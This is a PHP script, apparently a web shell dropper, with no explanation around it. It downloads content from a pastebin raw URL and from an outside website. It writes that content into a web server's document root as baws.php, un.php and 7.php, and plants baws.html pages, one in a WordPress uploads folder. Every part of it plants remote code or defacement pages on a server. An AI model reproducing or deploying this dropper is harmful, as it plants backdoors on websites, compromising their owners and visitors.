<?php
function http_get($url){
$im = curl_init($url);
curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($im, CURLOPT_HEADER, 0);
return curl_exec($im);
curl_close($im);
}
$check = $_SERVER['DOCUMENT_ROOT'] . "/baws.php" ;
$text = http_get('http://pastebin.com/raw/Z0WbhLbJ');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
echo $check."</br>";
}else 
echo "not exits";
echo "done .\n " ;



$check0 = $_SERVER['DOCUMENT_ROOT'] . "/un.php" ;
$text0 = http_get('http://pastebin.com/raw/Z0WbhLbJ');
$open0 = fopen($check0, 'w');
fwrite($open0, $text0);
fclose($open0);
if(file_exists($check0)){
echo $check0."</br>";
}else 
echo "not exits";
echo "done .\n " ;

$check2 = $_SERVER['DOCUMENT_ROOT'] . "/7.php" ;
$text2 = http_get('http://pastebin.com/raw/Z0WbhLbJ');
$open2 = fopen($check2, 'w');
fwrite($open2, $text2);
fclose($open2);
if(file_exists($check2)){
echo $check2."</br>";
}else 
echo "not exits";
echo "done .\n " ;
$check3=$_SERVER['DOCUMENT_ROOT'] . "/baws.html" ;
$text3 = http_get('http://www.areledarskapsakademi.com/ind.html');
$op3=fopen($check3, 'w');
fwrite($op3,$text3);
fclose($op3);
if(file_exists($check3)){
echo $check3."</br>";
}else 
echo "not exits";
echo "done .\n " ;
$check5=$_SERVER['DOCUMENT_ROOT'] . "/wp-content/uploads/baws.html" ;
$text5 = http_get('http://www.areledarskapsakademi.com/ind.html');
$op5=fopen($check5, 'w');
fwrite($op5,$text5);
fclose($op5);
if(file_exists($check5)){
echo $check5."</br>";
}else 
echo "not exits";
?>
